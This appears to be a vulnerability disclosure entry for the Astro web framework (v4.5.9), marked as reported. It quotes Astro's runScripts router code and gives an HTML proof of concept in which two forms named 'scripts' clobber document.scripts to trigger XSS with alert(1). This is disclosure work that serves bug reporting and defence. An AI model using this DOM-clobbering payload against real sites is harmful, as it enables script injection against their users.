## astro

### Meta

+ Library: astro
+ Stars: 45.7K
+ Version: v4.5.9
+ Payload: ```<form name="scripts">alert(1)</form><form name="scripts">alert(1)</form>```
+ Impact: XSS
+ CVE: N/A
+ Status: Reported
+ Foundby: TheHulk


### Library

URL: 
+ `https://github.com/withastro/astro`


### Vulnerable Code Snippet

```javascript
// https://github.com/withastro/astro/blob/7814a6cad15f06931f963580176d9b38aa7819f2/packages/astro/src/transitions/router.ts#L135-L156
function runScripts() {
	for (const script of Array.from(document.scripts)) {
		if (script.dataset.astroExec === '') continue;
		const type = script.getAttribute('type');
		if (type && type !== 'module' && type !== 'text/javascript') continue;
		const newScript = document.createElement('script');
		newScript.innerHTML = script.innerHTML;
		for (const attr of script.attributes) {
			newScript.setAttribute(attr.name, attr.value);
		}
		newScript.dataset.astroExec = '';
		script.replaceWith(newScript);
	}
}

runScripts();
```

### PoC
```html

<!--Library-->
<script>
function runScripts() {
	for (const script of Array.from(document.scripts)) {
		if (script.dataset.astroExec === '') continue;
		const type = script.getAttribute('type');
		if (type && type !== 'module' && type !== 'text/javascript') continue;
		const newScript = document.createElement('script');
		newScript.innerHTML = script.innerHTML;
		for (const attr of script.attributes) {
			newScript.setAttribute(attr.name, attr.value);
		}
		newScript.dataset.astroExec = '';
		script.replaceWith(newScript);
	}
}

runScripts();
</script>
<!--Library-->

<!--Payload-->
<form name="scripts">alert(1)</form>
<form name="scripts">alert(1)</form>
<!--Payload-->
```